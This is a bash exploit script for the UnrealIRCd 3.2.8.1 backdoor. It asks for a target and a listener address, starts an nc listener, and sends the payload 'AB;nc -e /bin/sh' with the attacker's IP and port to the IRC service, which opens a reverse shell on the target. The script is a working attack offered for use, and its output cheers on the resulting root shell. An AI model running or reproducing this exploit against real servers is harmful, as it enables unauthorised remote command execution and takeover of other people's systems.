#!/bin/bash

###############################################################
# Author : Piyush Raj <0x48piraj>                             #
# Vuln   : UnrealIRCd 3.2.8.1 Backdoor Command Execution      #
###############################################################

RED='\033[0;31m'        # Red Color
NC='\033[0m'            # No Color
GREEN='\033[0;32m'      # Green
YELLOW='\033[0;33m'     # Yellow


printf "\n"
printf "${GREEN}Description :${NC}\n\n"
printf "${YELLOW}UnrealIRCd 3.2.8.1, as distributed on certain mirror sites from November 2009 through June 2010, contains an externally introduced modification (Trojan Horse) in the DEBUG3_DOLOG_SYSTEM macro, which allows remote attackers to execute arbitrary commands.${NC}\n\n"

printf "${GREEN}Vulnerable Service${NC} : ${RED}UnrealIRCd 3.2.8.1${NC}\n"
printf "${GREEN}Default Port${NC}       : ${RED}6667${NC}\n"
printf "${GREEN}Target${NC}             : ${RED}Unix${NC}\n\n"


read -p "Enter target IP or hostname: " target
read -p "Enter target irc port (6667): " port
read -p "Enter your IP (reverse shell): " lhost
read -p "Which port you want to receive the shell (e.g. 4444): " lport

printf "${YELLOW}[*]${NC} Starting a listener on port $lport\n"

gnome-terminal --window -- nc -vnlp $lport

printf "${GREEN}[+]${NC} Started listener to grab r00t shell ...\n"
printf "${YELLOW}[*]${NC} Sleeping 5 seconds ...\n\n"
sleep 5
printf "[DEBUG INFO]\n\n"

echo "AB;nc -e /bin/sh $lhost $lport" | nc -w 3 $target $port
printf "\n"
printf "${GREEN}[+]${NC} Sent payload ...\n"
printf "${GREEN}[+]${NC} Enjoy!\n\n"
